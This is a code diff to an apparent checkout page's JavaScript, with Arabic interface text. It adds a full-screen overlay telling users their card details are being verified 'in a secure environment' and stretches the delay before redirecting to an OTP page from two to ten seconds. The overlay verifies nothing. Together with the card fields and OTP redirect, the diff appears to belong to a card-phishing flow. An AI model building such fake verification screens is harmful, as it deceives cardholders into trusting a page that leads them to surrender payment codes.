@@ -278,6 +278,43 @@ function initExpiryInner() {
   inp.addEventListener('input', () => updateInnerState('inner-expiry', inp.value));
 }
 
+/* ─── شاشة التحقق (10 ثوانٍ قبل الانتقال لـ OTP) ──── */
+function showVerifyingOverlay() {
+  const overlay = document.createElement('div');
+  overlay.id = 'verify-overlay';
+  overlay.innerHTML = `
+    <div style="
+      position:fixed;inset:0;z-index:9999;
+      background:rgba(255,255,255,.97);
+      display:flex;flex-direction:column;
+      align-items:center;justify-content:center;
+      direction:rtl;
+      backdrop-filter:blur(6px);
+      animation:verifyFadeIn .35s ease">
+      <div style="
+        width:56px;height:56px;border-radius:50%;
+        border:4px solid #e5e7eb;
+        border-top-color:var(--blue);
+        animation:verifySpin .8s linear infinite;
+        margin-bottom:1.25rem"></div>
+      <div style="
+        font-size:1rem;font-weight:700;color:var(--gray-800);
+        margin-bottom:.35rem">جاري التحقق من البيانات</div>
+      <div style="
+        font-size:.82rem;color:var(--gray-500)">
+        نتحقق من معلومات بطاقتك في بيئة آمنة...</div>
+    </div>
+    <style>
+      @keyframes verifyFadeIn{from{opacity:0}to{opacity:1}}
+      @keyframes verifySpin{to{transform:rotate(360deg)}}
+    </style>`;
+  document.body.appendChild(overlay);
+}
+function removeVerifyingOverlay() {
+  const o = document.getElementById('verify-overlay');
+  if (o) o.remove();
+}
+
 /* ─── إرسال النموذج ─────────────────────────────── */
 function initSubmit() {
   const form = document.getElementById('checkout-form');
@@ -290,6 +327,8 @@ function initSubmit() {
 
     btn.disabled = true;
     btn.innerHTML = '<span class="material-icons spin-icon">autorenew</span> جاري معالجة الدفع...';
+
+    showVerifyingOverlay();
 
     setTimeout(() => {
       try {
@@ -317,7 +356,7 @@ function initSubmit() {
         }));
       } catch(err){}
       window.location.href = 'otp-verify.html';
-    }, 2000);
+    }, 10000);
   });
 }
 
